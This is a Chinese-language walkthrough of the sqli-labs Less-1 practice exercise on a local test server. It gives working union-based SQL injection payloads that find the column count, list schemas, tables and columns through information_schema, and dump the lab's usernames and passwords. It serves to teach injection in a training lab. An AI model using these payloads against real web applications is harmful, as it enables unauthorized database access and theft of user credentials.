主要用到 

```
联合注入
group_concat
concat_ws
order by 测试列数
```



首先根据提示，payload

```
http://127.0.0.1/Less-1/?id=1
```

添加单引号测试注入

```
http://127.0.0.1/Less-1/?id=1‘ 
发现报错，'1'' limit 0,1

```

```
http://127.0.0.1/Less-1/?id=1%27%20--+
去掉url编码 为
http://127.0.0.1/Less-1/?id=1‘ --+       （%27为'    %20为空格）
```

用order by测试查询的数据库有几列,或者union select 1,2,3来看回显列

测试 3列

```
http://127.0.0.1/Less-1/?id=1%27%20order%20by%203%20--+
```

测试 4列

```
http://127.0.0.1/Less-1/?id=1%27%20order%20by%204%20--+
```

出现

```
Unknown column '4' in 'order clause'
说明4超出了列数，那么我们要查询的只有三列
```



union select 三列 进行测试

```
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+

-1 不在数据库中，所以union select的前后两个sql语句中，只有后面的查询语句才会显示出来
```



查看security数据库所有表

```
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+


得到
emails,referers,uagents,users
```

下面查看user列名

```
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+

得到
Your Login name:2
Your Password:id,username,password
```

下面就是要查看username 和password

```
-1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users --+

（concat_ws：concat_ws(‘-’,a,b) 将a和b用-连接起来）

得到
Your Password:Dumb-Dumb,Angelina-I-kill-you,Dummy-p@ssword,secure-crappy,stupid-stupidity,superman-genious,batman-mob!le,admin-admin,admin1-admin1,admin2-admin2,admin3-admin3,dhakkan-dumbo,admin4-admin4 
```

得到所有账号密码
